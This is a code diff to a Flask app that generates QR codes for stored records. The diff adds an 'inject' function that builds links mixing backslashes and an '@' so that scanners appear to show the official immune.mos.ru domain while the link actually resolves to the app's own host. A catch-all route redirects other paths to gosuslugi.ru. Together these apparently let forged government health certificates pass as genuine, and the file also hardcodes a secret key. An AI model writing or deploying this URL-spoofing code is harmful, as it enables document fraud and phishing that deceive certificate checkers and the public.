@@ -2,12 +2,17 @@ import sqlite3
 import qrcode
 from flask import Flask, render_template, redirect, request, abort, url_for, send_file
 from io import BytesIO
+from urllib.parse import urlparse
 
 DATABASE = "app.db"
 
 app = Flask(__name__)
 
 key = "IM33PMja2w40tGxo60TvgTCq2QWwHdEZ"
+
+def inject(path):
+	base = urlparse(request.url_root)
+	return f"{base.scheme}://{base.netloc}\\\\\\\\@immune.mos.ru/{base.path}/{path}?{base.query}"
 
 cur = sqlite3.connect(DATABASE).cursor()
 cur.execute("""
@@ -23,7 +28,7 @@ def get_db():
 	return sqlite3.connect(DATABASE)
 
 def create_qr(guid):
-	qr = qrcode.make(request.url_root[:-1] + url_for('get', guid=guid))
+	qr = qrcode.make(inject(url_for('get', guid=guid)))
 	io = BytesIO()
 	qr.save(io, "JPEG", quality=70)
 	io.seek(0)
@@ -57,6 +62,6 @@ def gen(guid):
 	return send_file(create_qr(guid), mimetype='image/jpeg')
 
 @app.route("/", defaults={'path': ""})
-@app.route("/<any:path>")
+@app.route("/<path:path>")
 def other(path):
 	return redirect("https://www.gosuslugi.ru/" + path, code=302)
